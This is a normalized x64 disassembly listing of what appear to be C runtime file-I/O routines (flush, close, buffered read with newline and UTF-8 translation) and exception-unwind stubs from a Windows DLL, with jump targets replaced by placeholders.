mov ecx edi
call sub_180028dc4
mov edi eax
mov rcx rbx
call sub_180026884
mov eax edi
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
or eax 0xffffffff
jmp r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180028f30
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
jne r-xdata
mov eax [ rcx + 0x18 ]
test al 0x83
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ rcx + 0x18 ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ rcx + 0x18 ] eax
jmp r-xdata
mov rax [ rcx + 0x10 ]
mov [ rcx ] rax
call sub_180026628
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ rdi + 0x18 ] eax
and [ rdi + 0x8 ] 0x0
cmp eax 0xffffffff
je r-xdata
mov rcx rdi
call sub_1800268f0
mov r8d [ rdi + 0x24 ]
mov rdx [ rdi + 0x10 ]
mov ecx eax
call sub_1800299c4
mov [ rdi + 0x8 ] eax
test eax eax
je r-xdata
test [ rdi + 0x18 ] 0x82
jne r-xdata
cmp [ rdi + 0x24 ] 0x200
jne r-xdata
mov rcx rdi
call sub_1800268f0
cmp eax 0xffffffff
je r-xdata
mov rcx [ rdi ]
dec [ rdi + 0x8 ]
movzx eax [ rcx ]
inc rcx
mov [ rdi ] rcx
jmp r-xdata
test [ rdi + 0x18 ] 0x8
je r-xdata
lea r11 [ rw-data ]
mov rcx rdi
call sub_1800268f0
cmp eax 0xfffffffe
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax [ rdi + 0x24 ]
test [ rdi + 0x18 ] 0x400
mov ecx 0x1000
cmove eax ecx
mov [ rdi + 0x24 ] eax
bts [ rdi + 0x18 ] 0xd
mov rcx rdi
call sub_1800268f0
mov rcx rdi
lea rsi [ rw-data ]
movsxd rbx eax
sar rbx 0x5
call sub_1800268f0
mov r11d eax
and r11d 0x1f
imul r11 r11 0x58
add r11 [ rsi + rbx * 8 ]
jmp r-xdata
mov al [ r11 + 0x8 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_1800290e4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
or edi 0xffffffff
mov rbx rcx
test rcx rcx
jne r-xdata
test [ rcx + 0x18 ] 0x83
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
or eax edi
jmp r-xdata
and [ rbx + 0x18 ] 0x0
mov eax edi
call sub_180028914
mov rcx rbx
mov edi eax
call sub_180029c60
mov rcx rbx
call sub_1800268f0
mov ecx eax
call sub_180029b9c
test eax eax
jns r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
or edi 0xffffffff
jmp r-xdata
call sub_18001c80c
and [ rbx + 0x28 ] 0x0
sub_180029160
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x20
mov rbx rcx
or edi 0xffffffff
xor eax eax
test rcx rcx
setne al
test eax eax
jne r-xdata
test [ rcx + 0x18 ] 0x40
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x16
call sub_1800207e0
call sub_1800267ec
nop
mov rcx rbx
call sub_1800290e4
mov edi eax
mov rcx rbx
call sub_180026884
jmp r-xdata
and [ rcx + 0x18 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov eax edi
jmp r-xdata
sub_1800291c8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_1800207e0
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rbx rdi
mov rsi rdi
sar rsi 0x5
lea r12 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_18002873c
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
or ebx 0xffffffff
mov ecx edi
call sub_1800286c8
mov rcx rax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
xor ebx ebx
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_1800287e4
mov eax ebx
jmp r-xdata
call sub_18001e704
mov [ rax ] ebx
test ebx ebx
je r-xdata
sub_1800292a0
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] ecx
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x58
movsxd rax ecx
mov ebx r8d
mov [ rbp - 0x20 ] 0xfffffffe
mov [ rbp - 0x1c ] ebx
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
test ecx ecx
js r-xdata
call sub_18001e704
xor edi edi
mov [ rax ] edi
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e704
mov [ rax ] edi
call sub_18001e6e4
mov [ rax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rsi rax
mov r15 rax
lea r9 [ __dos_header ]
sar r15 0x5
and esi 0x1f
mov rcx [ r9 + r15 * 8 + 0x519c0 ]
imul rsi rsi 0x58
mov al [ rcx + rsi + 0x8 ]
test al 0x1
je r-xdata
cmp ebx 0x7fffffff
jbe r-xdata
mov r12d edi
test ebx ebx
je r-xdata
call sub_18001e704
mov [ rax ] edi
call sub_18001e6e4
mov [ rax ] 0x16
jmp r-xdata
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
call sub_1800207e0
add rsp 0x58
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
test rdx rdx
je r-xdata
mov r13b [ rcx + rsi + 0x38 ]
mov r8d 0x4
add r13b r13b
sar r13b 0x1
movsx ecx r13b
mov [ rbp + 0x60 ] r13b
dec ecx
je r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
dec ecx
jne r-xdata
shr ebx 0x1
cmp ebx r8d
cmovb ebx r8d
mov ecx ebx
call sub_180020800
mov r14 rax
test rax rax
jne r-xdata
mov r14 rdx
jmp r-xdata
mov eax ebx
not eax
test al 0x1
je r-xdata
mov ecx [ rbp + 0x48 ]
xor edx edx
lea r8d [ rdx + 0x1 ]
call sub_180025c6c
lea r9 [ __dos_header ]
mov r11 rax
mov rax [ r9 + r15 * 8 + 0x519c0 ]
mov [ rax + rsi + 0x40 ] r11
call sub_18001e6e4
mov [ rax ] 0xc
call sub_18001e704
mov [ rax ] 0x8
jmp r-xdata
mov rax [ r9 + r15 * 8 + 0x519c0 ]
mov rdx r14
mov r8d 0xa
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
and ebx 0xfffffffe
mov rcx [ r9 + r15 * 8 + 0x519c0 ]
lea r9 [ rbp - 0x24 ]
mov r8d ebx
mov rcx [ rcx + rsi ]
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ rax + rsi + 0x9 ]
cmp cl r8b
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x5
jne r-xdata
movsxd rdx [ rbp - 0x24 ]
test edx edx
js r-xdata
test ebx ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_18001e704
mov [ rax ] 0x5
jmp r-xdata
mov eax ebx
cmp rdx rax
ja r-xdata
mov [ r14 ] cl
mov rax [ r9 + r15 * 8 + 0x519c0 ]
or r10d 0xffffffff
add ebx r10d
lea rdx [ r14 + 0x1 ]
lea r12d [ r8 - 0x9 ]
mov [ rax + rsi + 0x9 ] r8b
test r13b r13b
je r-xdata
mov ecx eax
call sub_18001e724
jmp r-xdata
mov ebx edi
jmp r-xdata
or ebx 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
add r12d edx
mov rax [ r8 + r15 * 8 + 0x519c0 ]
test [ rax + rsi + 0x8 ] 0x80
je r-xdata
mov rax [ r9 + r15 * 8 + 0x519c0 ]
mov cl [ rax + rsi + 0x39 ]
cmp cl r8b
je r-xdata
mov r13 [ rbp + 0x50 ]
mov ebx [ rbp - 0x20 ]
cmp r13b 0x2
je r-xdata
test ebx ebx
je r-xdata
cmp ebx 0xfffffffe
cmove ebx r12d
mov eax ebx
jmp r-xdata
mov rcx r14
call sub_18001c80c
test edx edx
mov edx 0xa
je r-xdata
test edx edx
je r-xdata
mov [ rdx ] cl
mov rax [ r9 + r15 * 8 + 0x519c0 ]
add ebx r10d
inc rdx
lea r12d [ r8 - 0x8 ]
mov [ rax + rsi + 0x39 ] r8b
cmp r13b 0x1
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r14 ] dx
jne r-xdata
and [ rax + rsi + 0x8 ] 0xfb
cmp [ r14 ] 0xa
jne r-xdata
mov rax [ r9 + r15 * 8 + 0x519c0 ]
mov cl [ rax + rsi + 0x3a ]
cmp cl r8b
je r-xdata
mov r12d ebx
sub r12d r14d
mov r12d 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
mov r12d ebx
sub r12d r14d
cmp [ rbp + 0x60 ] 0x1
jne r-xdata
mov r12d 0xd
or [ rax + rsi + 0x8 ] 0x4
jmp r-xdata
test ebx ebx
je r-xdata
mov rax [ r8 + r15 * 8 + 0x519c0 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp ax r12w
je r-xdata
movsxd rax r12d
mov rbx r14
mov r13 r14
add rax r14
mov [ rbp + 0x60 ] rax
cmp r14 rax
jae r-xdata
test r12d r12d
je r-xdata
mov rax [ r8 + r15 * 8 + 0x519c0 ]
test [ rax + rsi + 0x8 ] 0x40
jne r-xdata
cmp al r12b
je r-xdata
movsxd rax r12d
mov rbx r14
mov r13 r14
add rax r14
mov [ rbp - 0x18 ] rax
cmp r14 rax
jae r-xdata
mov [ rdx ] cl
mov rax [ r9 + r15 * 8 + 0x519c0 ]
inc rdx
lea r12d [ r8 - 0x7 ]
add ebx r10d
mov [ rax + rsi + 0x3a ] r8b
movzx eax [ r13 ]
mov [ rbx ] ax
add rbx 0x2
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
mov rax [ rbp + 0x60 ]
add rax 0xfffffffffffffffe
cmp r13 rax
jae r-xdata
mov [ rbx ] ax
add rbx 0x2
add r13 0x2
jmp r-xdata
dec rbx
test [ rbx ] 0x80
jne r-xdata
mov al [ r13 ]
mov [ rbx ] al
inc rbx
or [ rax + rsi + 0x8 ] 0x2
jmp r-xdata
mov rax [ rbp - 0x18 ]
dec rax
cmp r13 rax
jae r-xdata
mov [ rbx ] al
inc rbx
inc r13
jmp r-xdata
mov rcx [ r8 + r15 * 8 + 0x519c0 ]
lea r9 [ rbp - 0x24 ]
lea rdx [ rbp - 0x28 ]
mov rcx [ rcx + rsi ]
mov r8d 0x2
add r13 0x2
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea rax [ r13 + 0x2 ]
cmp [ rax ] dx
jne r-xdata
cmp r13 [ rbp + 0x60 ]
jb r-xdata
mov edx 0x1
jmp r-xdata
inc rbx
jmp r-xdata
mov rcx [ r8 + r15 * 8 + 0x519c0 ]
lea r9 [ rbp - 0x24 ]
lea rdx [ rbp + 0x58 ]
mov rcx [ rcx + rsi ]
mov r8d 0x1
inc r13
mov [ rsp + 0x20 ] rdi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea rax [ r13 + 0x1 ]
cmp [ rax ] 0xa
jne r-xdata
cmp r13 [ rbp - 0x18 ]
jb r-xdata
cmp [ rbp - 0x24 ] edi
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov r13 rax
jmp r-xdata
add r13 0x4
jmp r-xdata
movzx eax [ r13 ]
cmp ax 0x1a
je r-xdata
jmp r-xdata
movzx eax [ rbx ]
cmp [ rax + r8 + 0x4ef80 ] dil
je r-xdata
mov eax [ rbp - 0x1c ]
mov r13 [ rbp + 0x50 ]
sub ebx r14d
shr eax 0x1
mov r9d ebx
mov r8 r14
mov [ rsp + 0x28 ] eax
xor edx edx
mov ecx 0xfde9
mov [ rsp + 0x20 ] r13
call [ MultiByteToWideChar@IAT ]
mov r12d eax
test eax eax
jne r-xdata
cmp [ rbp - 0x24 ] edi
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov r13 rax
jmp r-xdata
add r13 0x2
jmp r-xdata
mov al [ r13 ]
cmp al 0x1a
je r-xdata
jmp r-xdata
mov edx 0xa
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r15 * 8 + 0x519c0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] r12w
mov [ rbx ] dx
jmp r-xdata
cmp edx 0x4
jg r-xdata
movzx ecx [ rbx ]
movsx eax [ rcx + r8 + 0x4ef80 ]
test eax eax
jne r-xdata
cmp eax ebx
mov ebx [ rbp - 0x20 ]
lea rax [ __dos_header ]
mov rax [ rax + r15 * 8 + 0x519c0 ]
setne dil
add r12d r12d
mov [ rax + rsi + 0x48 ] edi
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call sub_18001e724
or ebx 0xffffffff
jmp r-xdata
lea r8 [ __dos_header ]
lea r8 [ __dos_header ]
mov rax [ r8 + r15 * 8 + 0x519c0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
mov [ rbx ] r12b
mov [ rbx ] 0xa
jmp r-xdata
cmp rbx r14
jne r-xdata
mov edx 0xa
cmp [ rbp - 0x28 ] dx
je r-xdata
add rbx 0x2
cmp rbx r14
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_18001e6e4
mov [ rax ] 0x2a
cmp r14 r13
je r-xdata
cmp rbx r14
jne r-xdata
cmp [ rbp + 0x58 ] 0xa
je r-xdata
inc rbx
mov ecx [ rbp + 0x48 ]
mov rdx 0xfffffffffffffffe
lea r8d [ rdx + 0x3 ]
call sub_180025c6c
mov edx 0xa
lea r8 [ __dos_header ]
cmp [ rbp - 0x28 ] dx
je r-xdata
mov edx 0xa
cmp [ rbp - 0x28 ] dx
jne r-xdata
mov [ rbx ] r12w
mov al [ rbp - 0x28 ]
mov rcx [ r8 + r15 * 8 + 0x519c0 ]
mov [ rcx + rsi + 0x9 ] al
mov al [ rbp - 0x27 ]
mov rcx [ r8 + r15 * 8 + 0x519c0 ]
mov [ rcx + rsi + 0x39 ] al
mov rax [ r8 + r15 * 8 + 0x519c0 ]
mov [ rax + rsi + 0x3a ] dl
jmp r-xdata
dec rbx
inc edx
mov rax [ r8 + r15 * 8 + 0x519c0 ]
test [ rax + rsi + 0x8 ] 0x48
je r-xdata
movsxd rax edx
add rbx rax
jmp r-xdata
mov ecx [ rbp + 0x48 ]
mov r8d 0x1
or rdx 0xffffffffffffffff
call sub_180025c6c
cmp [ rbp + 0x58 ] 0xa
lea r8 [ __dos_header ]
je r-xdata
cmp [ rbp + 0x58 ] 0xa
jne r-xdata
mov [ rbx ] r12b
mov rcx [ r8 + r15 * 8 + 0x519c0 ]
mov al [ rbp + 0x58 ]
mov [ rcx + rsi + 0x9 ] al
jmp r-xdata
jmp r-xdata
mov ecx [ rbp + 0x48 ]
neg edx
mov r8d 0x1
movsxd rdx edx
call sub_180025c6c
inc rbx
mov [ rax + rsi + 0x9 ] cl
cmp edx 0x2
jl r-xdata
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov al [ rbx ]
mov rcx [ r8 + r15 * 8 + 0x519c0 ]
inc rbx
mov [ rcx + rsi + 0x39 ] al
movsxd rax edx
sub rbx rax
jmp r-xdata
mov al [ rbx ]
mov rcx [ r8 + r15 * 8 + 0x519c0 ]
inc rbx
mov [ rcx + rsi + 0x3a ] al
sub_1800299c4
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x8 ] ecx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov esi r8d
mov r13 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
xor ebx ebx
test ecx ecx
js r-xdata
call sub_18001e704
xor ebx ebx
mov [ rax ] ebx
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e704
mov [ rax ] ebx
call sub_18001e6e4
mov [ rax ] 0x9
cmp edi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov r12 rdi
mov r14 rdi
sar r14 0x5
lea r15 [ rw-data ]
and r12d 0x1f
imul r12 r12 0x58
mov rax [ r15 + r14 * 8 ]
movsx ecx [ rax + r12 + 0x8 ]
and ecx 0x1
je r-xdata
mov eax ebx
cmp r8d 0x7fffffff
setbe al
test eax eax
jne r-xdata
mov ecx edi
call sub_18002873c
nop
mov rax [ r15 + r14 * 8 ]
test [ rax + r12 + 0x8 ] 0x1
je r-xdata
call sub_18001e704
mov [ rax ] ebx
call sub_18001e6e4
mov [ rax ] 0x16
jmp r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
call sub_18001e704
mov [ rax ] ebx
or ebx 0xffffffff
mov r8d esi
mov rdx r13
mov ecx edi
call sub_1800292a0
mov ebx eax
jmp r-xdata
call sub_1800207e0
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
mov ecx edi
call sub_1800287e4
mov eax ebx
jmp r-xdata
sub_180029ae0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rdi ecx
mov ecx edi
call sub_1800286c8
cmp rax 0xffffffffffffffff
je r-xdata
xor ebx ebx
mov rax [ rw-data ]
mov ecx 0x2
cmp edi 0x1
jne r-xdata
xor eax eax
mov ecx ebx
call sub_18001e724
or eax 0xffffffff
jmp r-xdata
cmp edi ecx
jne r-xdata
test [ rax + 0xb8 ] dil
jne r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_1800286c8
mov rcx rax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ rax + 0x60 ] 0x1
je r-xdata
call sub_1800286c8
mov ecx 0x1
mov rbx rax
call sub_1800286c8
cmp rax rbx
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov ecx edi
call sub_18002861c
mov r11 rdi
mov rcx rdi
sar rcx 0x5
and r11d 0x1f
lea rdx [ rw-data ]
mov rcx [ rdx + rcx * 8 ]
imul r11 r11 0x58
mov [ rcx + r11 + 0x8 ] 0x0
test ebx ebx
je r-xdata
sub_180029b9c
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
sub rsp 0x20
movsxd rbx ecx
cmp ebx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
jmp r-xdata
call sub_18001e704
and [ rax ] 0x0
call sub_18001e6e4
mov [ rax ] 0x9
call sub_1800207e0
cmp ebx [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov rdi rbx
mov rsi rbx
sar rsi 0x5
lea r12 [ rw-data ]
and edi 0x1f
imul rdi rdi 0x58
mov rax [ r12 + rsi * 8 ]
movsx ecx [ rax + rdi + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx ebx
call sub_18002873c
nop
mov rax [ r12 + rsi * 8 ]
test [ rax + rdi + 0x8 ] 0x1
je r-xdata
call sub_18001e6e4
mov [ rax ] 0x9
or edi 0xffffffff
mov ecx ebx
call sub_180029ae0
mov edi eax
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov ecx ebx
call sub_1800287e4
mov eax edi
jmp r-xdata
sub_180029c60
push rbx
sub rsp 0x20
test [ rcx + 0x18 ] 0x83
mov rbx rcx
je r-xdata
add rsp 0x20
pop rbx
retn
test [ rcx + 0x18 ] 0x8
je r-xdata
mov rcx [ rcx + 0x10 ]
call sub_18001c80c
and [ rbx + 0x18 ] 0xfffffbf7
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x10 ] rax
mov [ rbx + 0x8 ] eax
sub_180029cc0
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rdx
inc rdx
mov rcx [ rbp + 0x70 ]
add rcx 0x20
call sub_180001130
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180029d00
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] 0x0
xor eax eax
mov [ rbx ] ax
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180029d40
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x48 ]
test rbx rbx
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
sub_180029e00
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x20 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_1800024f0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_180029e70
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0xa8 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0xa8 ] 0xfffffffe
lea rcx [ rbp + 0x50 ]
call sub_1800027f0
sub_180029ea0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0xa8 ]
and eax 0x4
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0xa8 ] 0xfffffffb
lea rcx [ rbp + 0x28 ]
call sub_1800027f0
sub_180029f50
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov rdx [ rbp + 0x78 ]
mov [ rbp + 0x78 ] rdx
inc rdx
mov rcx [ rbp + 0x70 ]
add rcx 0x20
call sub_180003280
mov [ rbp + 0x88 ] rax
lea rax [ r-xdata ]
add rsp 0x20
pop rbp
retn
sub_180029f90
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x70 ]
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rcx [ rbx ]
call j_sub_18001c80c
sub_180029fd0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x48 ]
test rbx rbx
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx rbx
call j_sub_18001c80c
call sub_18001c80c
sub_18002a030
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x48 ]
test rbx rbx
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rcx [ rbx ]
call sub_18001c80c
mov rcx rbx
call j_sub_18001c80c
sub_18002a120
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x60 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_1800024f0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_18002a160
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x40 ]
mov rdi [ rbp + 0x50 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rsi [ rbp + 0x58 ]
mov rdx rbx
mov rcx rsi
call sub_1800131e0
add rbx 0x10
cmp rbx rdi
jne r-xdata
sub_18002a2f0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rdi
sub rsp 0x20
mov rbp rdx
mov rbx [ rbp + 0x50 ]
mov rdi [ rbp + 0x60 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
nop [ rax ] eax
lea rcx [ rbx + 0x8 ]
call sub_180002680
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_18002a4f0
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x38
mov rbp rdx
mov r8d 0x19
lea rdx [ rw-data ]
mov rbx [ rbp + 0x40 ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rbp + 0x470 ]
mov rcx rbx
call sub_180009450
mov rcx [ rbp + 0x38 ]
mov rdx [ rcx ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rdx + 0xc ]
mov rdx rax
mov rcx [ rbp + 0x48 ]
call sub_180004760
nop
lea rax [ r-xdata ]
add rsp 0x38
pop rbp
pop rbx
retn
sub_18002a570
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x30
mov rbp rdx
mov [ rbp + 0x1d8 ] 0xf
mov [ rbp + 0x1d0 ] 0x0
mov [ rbp + 0x1c0 ] 0x0
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0x600 ]
lea rcx [ rbp + 0x1c0 ]
call sub_180003a40
mov r11 [ rbp + 0x38 ]
mov rax [ r11 ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rax + 0xc ]
lea rdx [ rbp + 0x1c0 ]
mov rcx [ rbp + 0x48 ]
call sub_180004760
nop
lea rax [ r-xdata ]
add rsp 0x30
pop rbp
retn
sub_18002a600
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
sub rsp 0x38
mov rbp rdx
mov r8d 0x19
lea rdx [ rw-data ]
mov rbx [ rbp + 0x30 ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rbp + 0x4e8 ]
mov rcx rbx
call sub_180009450
mov rcx [ rbp + 0x38 ]
mov rdx [ rcx ]
mov [ rsp + 0x20 ] 0x64
xor r9d r9d
mov r8d [ rdx + 0xc ]
mov rdx rax
mov rcx [ rbp + 0x48 ]
call sub_180004760
nop
lea rax [ r-xdata ]
add rsp 0x38
pop rbp
pop rbx
retn
sub_18002a6d0
push rbp
sub rsp 0x20
mov rbp rdx
mov eax [ rbp + 0x44 ]
and eax 0x1
test eax eax
je r-xdata
add rsp 0x20
pop rbp
retn
and [ rbp + 0x44 ] 0xfffffffe
mov rcx [ rbp + 0x60 ]
call sub_1800035f0
sub_18002a720
mov [ rsp + 0x10 ] rdx
push rbx
push rbp
push rsi
push rdi
sub rsp 0x28
mov rbp rdx
mov rbx [ rbp + 0x60 ]
mov rdi [ rbp + 0x70 ]
cmp rbx rdi
je r-xdata
xor edx edx
xor ecx ecx
call sub_18001c8f0
nop
int3
mov rsi [ rbp + 0x78 ]
mov rdx rbx
mov rcx rsi
call sub_1800024f0
add rbx 0x28
cmp rbx rdi
jne r-xdata
sub_18002a990
mov [ rsp + 0x10 ] rdx
push rbp
sub rsp 0x20
mov rbp rdx
mov r8 [ rbp + 0x30 ]
mov rdx [ rbp + 0x38 ]
mov rcx [ rbp + 0x28 ]
call sub_18000c7c0
nop
lea rax [ sub_18000cc6d ]
add rsp 0x20
pop rbp
retn
sub_18002aa80
mov [ rsp + 0x10 ] rdx
push rbp
push rdi
sub rsp 0x38
mov rbp rdx
mov r8d 0xc
lea rdx [ rw-data ]
mov rdi [ rbp + 0x30 ]
mov rcx rdi
call sub_1800088c0
lea rdx [ rbp + 0xa8 ]
mov rcx rdi
call sub_1800092e0
mov rdi rax
lea rax [ rbp + 0x58 ]
cmp rax rdi
je r-xdata
cmp [ rbp + 0xc0 ] 0x8
jb r-xdata
cmp [ rbp + 0x70 ] 0x8
jb r-xdata
lea rax [ r-xdata ]
add rsp 0x38
pop rdi
pop rbp
retn
mov rcx [ rbp + 0xa8 ]
call j_sub_18001c80c
nop
mov [ rbp + 0x70 ] 0x7
mov [ rbp + 0x68 ] 0x0
xor eax eax
mov [ rbp + 0x58 ] ax
